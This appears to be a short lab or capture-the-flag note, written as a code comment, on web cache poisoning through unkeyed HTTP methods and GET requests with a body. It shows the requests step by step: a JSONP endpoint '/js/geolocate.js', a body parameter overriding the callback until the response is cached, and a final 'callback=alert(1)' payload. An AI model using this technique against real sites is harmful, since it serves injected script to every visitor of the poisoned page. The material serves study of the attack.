/*

If the HTTP methods are not keyed (if cache serve non-unique response 
regardless of what HTTP method was used in a request), we might:

a. poison cache using GET with a body containing mal parameters
(if a website accepts GET requests that have a body) 
            or
X-HTTP-Method-Override: POST

b. or post request with body containing mal parameters

1) /js/geolocate.js?callback=setCountryCookie gets called on the homepage
       <script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie">


2) GET /js/geolocate.js?callback=setCountryCookie HTTP/2

// this should be our sink
// send to repeater

setCountryCookie({
    "country":"United Kingdom"
}
);

3) GET /js/geolocate.js?callback=setCountryCookie HTTP/2
   callback=123

// send till x-cache:miss and we see it reflect in the response js function call

123({
    "country":"United Kingdom"
}
);

4) GET /js/geolocate.js?callback=setCountryCookie HTTP/2
   callback=alert(1)


*/